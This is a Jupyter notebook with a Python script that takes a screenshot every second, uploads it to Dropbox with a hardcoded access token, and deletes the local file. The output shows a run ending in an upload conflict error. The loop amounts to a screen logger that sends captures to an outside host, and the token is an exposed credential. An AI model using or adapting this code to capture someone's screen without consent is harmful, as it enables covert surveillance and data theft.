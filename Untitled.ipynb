{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "6246bbc8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pyautogui in f:\\anaconda\\lib\\site-packages (0.9.54)Note: you may need to restart the kernel to use updated packages.\n",
      "\n",
      "Requirement already satisfied: pymsgbox in f:\\anaconda\\lib\\site-packages (from pyautogui) (1.0.9)\n",
      "Requirement already satisfied: pytweening>=1.0.4 in f:\\anaconda\\lib\\site-packages (from pyautogui) (1.0.7)\n",
      "Requirement already satisfied: pyscreeze>=0.1.21 in f:\\anaconda\\lib\\site-packages (from pyautogui) (0.1.30)\n",
      "Requirement already satisfied: pygetwindow>=0.0.5 in f:\\anaconda\\lib\\site-packages (from pyautogui) (0.0.9)\n",
      "Requirement already satisfied: mouseinfo in f:\\anaconda\\lib\\site-packages (from pyautogui) (0.1.3)\n",
      "Requirement already satisfied: pyrect in f:\\anaconda\\lib\\site-packages (from pygetwindow>=0.0.5->pyautogui) (0.2.0)\n",
      "Requirement already satisfied: Pillow>=9.3.0 in f:\\anaconda\\lib\\site-packages (from pyscreeze>=0.1.21->pyautogui) (9.4.0)\n",
      "Requirement already satisfied: pyperclip in f:\\anaconda\\lib\\site-packages (from mouseinfo->pyautogui) (1.8.2)\n"
     ]
    }
   ],
   "source": [
    "\n",
    "pip install pyautogui"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "68c2adff",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: dropbox in f:\\anaconda\\lib\\site-packages (11.36.2)\n",
      "Requirement already satisfied: requests>=2.16.2 in f:\\anaconda\\lib\\site-packages (from dropbox) (2.31.0)\n",
      "Requirement already satisfied: six>=1.12.0 in f:\\anaconda\\lib\\site-packages (from dropbox) (1.16.0)\n",
      "Requirement already satisfied: stone>=2 in f:\\anaconda\\lib\\site-packages (from dropbox) (3.3.1)\n",
      "Requirement already satisfied: charset-normalizer<4,>=2 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (2.0.4)\n",
      "Requirement already satisfied: idna<4,>=2.5 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (3.4)\n",
      "Requirement already satisfied: urllib3<3,>=1.21.1 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (1.26.16)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (2023.7.22)\n",
      "Requirement already satisfied: ply>=3.4 in f:\\anaconda\\lib\\site-packages (from stone>=2->dropbox) (3.11)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install dropbox"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1be5cfbb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "file upload\n",
      "file upload\n",
      "file upload\n",
      "file upload\n",
      "file upload\n",
      "file upload\n",
      "file upload\n"
     ]
    },
    {
     "ename": "ApiError",
     "evalue": "ApiError('8169b83b47c34137a35a3182c94ef28b', UploadError('path', UploadWriteFailed(reason=WriteError('conflict', WriteConflictError('file', None)), upload_session_id='pid_upload_session:ABIHZ-BNpAmc4v3hkw3yS-PC0ZH5wa100SeK9DLmjFJ2V1VXmw')))",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mApiError\u001b[0m                                  Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[3], line 34\u001b[0m\n\u001b[0;32m     31\u001b[0m \u001b[38;5;28;01mwhile\u001b[39;00m(\u001b[38;5;28;01mTrue\u001b[39;00m):\n\u001b[0;32m     32\u001b[0m     screenshot_file \u001b[38;5;241m=\u001b[39m take_screenshot()\n\u001b[1;32m---> 34\u001b[0m     upload_to_dropbox(screenshot_file)\n\u001b[0;32m     36\u001b[0m     os\u001b[38;5;241m.\u001b[39mremove(screenshot_file)\n\u001b[0;32m     37\u001b[0m     time\u001b[38;5;241m.\u001b[39msleep(\u001b[38;5;241m1\u001b[39m)\n",
      "Cell \u001b[1;32mIn[3], line 28\u001b[0m, in \u001b[0;36mupload_to_dropbox\u001b[1;34m(file_path)\u001b[0m\n\u001b[0;32m     25\u001b[0m dbx \u001b[38;5;241m=\u001b[39m dropbox\u001b[38;5;241m.\u001b[39mDropbox(ACCESS_TOKEN)\n\u001b[0;32m     27\u001b[0m \u001b[38;5;28;01mwith\u001b[39;00m \u001b[38;5;28mopen\u001b[39m (file_path, \u001b[38;5;124m'\u001b[39m\u001b[38;5;124mrb\u001b[39m\u001b[38;5;124m'\u001b[39m) \u001b[38;5;28;01mas\u001b[39;00m f:\n\u001b[1;32m---> 28\u001b[0m     dbx\u001b[38;5;241m.\u001b[39mfiles_upload(f\u001b[38;5;241m.\u001b[39mread(),\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m/\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mfile_path\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m     29\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mfile upload\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n",
      "File \u001b[1;32mF:\\anaconda\\Lib\\site-packages\\dropbox\\base.py:3210\u001b[0m, in \u001b[0;36mDropboxBase.files_upload\u001b[1;34m(self, f, path, mode, autorename, client_modified, mute, property_groups, strict_conflict, content_hash)\u001b[0m\n\u001b[0;32m   3178\u001b[0m \u001b[38;5;250m\u001b[39m\u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[0;32m   3179\u001b[0m \u001b[38;5;124;03mCreate a new file with the contents provided in the request. Do not use\u001b[39;00m\n\u001b[0;32m   3180\u001b[0m \u001b[38;5;124;03mthis to upload a file larger than 150 MB. Instead, create an upload\u001b[39;00m\n\u001b[1;32m   (...)\u001b[0m\n\u001b[0;32m   3200\u001b[0m \u001b[38;5;124;03m    :class:`dropbox.files.UploadError`\u001b[39;00m\n\u001b[0;32m   3201\u001b[0m \u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[0;32m   3202\u001b[0m arg \u001b[38;5;241m=\u001b[39m files\u001b[38;5;241m.\u001b[39mUploadArg(path,\n\u001b[0;32m   3203\u001b[0m                       mode,\n\u001b[0;32m   3204\u001b[0m                       autorename,\n\u001b[1;32m   (...)\u001b[0m\n\u001b[0;32m   3208\u001b[0m                       strict_conflict,\n\u001b[0;32m   3209\u001b[0m                       content_hash)\n\u001b[1;32m-> 3210\u001b[0m r \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mrequest(\n\u001b[0;32m   3211\u001b[0m     files\u001b[38;5;241m.\u001b[39mupload,\n\u001b[0;32m   3212\u001b[0m     \u001b[38;5;124m'\u001b[39m\u001b[38;5;124mfiles\u001b[39m\u001b[38;5;124m'\u001b[39m,\n\u001b[0;32m   3213\u001b[0m     arg,\n\u001b[0;32m   3214\u001b[0m     f,\n\u001b[0;32m   3215\u001b[0m )\n\u001b[0;32m   3216\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m r\n",
      "File \u001b[1;32mF:\\anaconda\\Lib\\site-packages\\dropbox\\dropbox_client.py:351\u001b[0m, in \u001b[0;36m_DropboxTransport.request\u001b[1;34m(self, route, namespace, request_arg, request_binary, timeout)\u001b[0m\n\u001b[0;32m    347\u001b[0m deserialized_result \u001b[38;5;241m=\u001b[39m stone_serializers\u001b[38;5;241m.\u001b[39mjson_compat_obj_decode(\n\u001b[0;32m    348\u001b[0m     returned_data_type, obj, strict\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mFalse\u001b[39;00m)\n\u001b[0;32m    350\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(res, RouteErrorResult):\n\u001b[1;32m--> 351\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m ApiError(res\u001b[38;5;241m.\u001b[39mrequest_id,\n\u001b[0;32m    352\u001b[0m                    deserialized_result,\n\u001b[0;32m    353\u001b[0m                    user_message_text,\n\u001b[0;32m    354\u001b[0m                    user_message_locale)\n\u001b[0;32m    355\u001b[0m \u001b[38;5;28;01melif\u001b[39;00m route_style \u001b[38;5;241m==\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_ROUTE_STYLE_DOWNLOAD:\n\u001b[0;32m    356\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m (deserialized_result, res\u001b[38;5;241m.\u001b[39mhttp_resp)\n",
      "\u001b[1;31mApiError\u001b[0m: ApiError('8169b83b47c34137a35a3182c94ef28b', UploadError('path', UploadWriteFailed(reason=WriteError('conflict', WriteConflictError('file', None)), upload_session_id='pid_upload_session:ABIHZ-BNpAmc4v3hkw3yS-PC0ZH5wa100SeK9DLmjFJ2V1VXmw')))"
     ]
    }
   ],
   "source": [
    "import pyautogui\n",
    "import datetime\n",
    "import dropbox\n",
    "import os\n",
    "import time\n",
    "\n",
    "\n",
    "ACCESS_TOKEN = 'sl.BvaCMAkgK8RRyMJWYPTZ_hcpXsS8OHZ0NwlEN43wj9nCX3TkGDR7SlWNGpeV28We47XZkGVrK25BQUkc2cKFC3ObOLOqnHOHaxN5mwoGia2me_p9NggbBcIRIZ2gHme-KqQC-G5zI2tcl7HkJI4e'\n",
    "\n",
    "def take_screenshot():\n",
    "\n",
    "    now = datetime.datetime.now()\n",
    "\n",
    "    timestamp = now.strftime(\"%Y-%m_%d_%H-%S\")\n",
    "\n",
    "\n",
    "    screenshot_file=f\"screenshot_{timestamp}.png\"\n",
    "\n",
    "    screenshot= pyautogui.screenshot()\n",
    "\n",
    "    screenshot.save(screenshot_file)\n",
    "\n",
    "    return screenshot_file\n",
    "def upload_to_dropbox(file_path):\n",
    "    dbx = dropbox.Dropbox(ACCESS_TOKEN)\n",
    "    \n",
    "    with open (file_path, 'rb') as f:\n",
    "        dbx.files_upload(f.read(),f\"/{file_path}\")\n",
    "        print(\"file upload\")\n",
    "        \n",
    "while(True):\n",
    "    screenshot_file = take_screenshot()\n",
    "\n",
    "    upload_to_dropbox(screenshot_file)\n",
    "\n",
    "    os.remove(screenshot_file)\n",
    "    time.sleep(1)\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "835a20be",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65935367",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
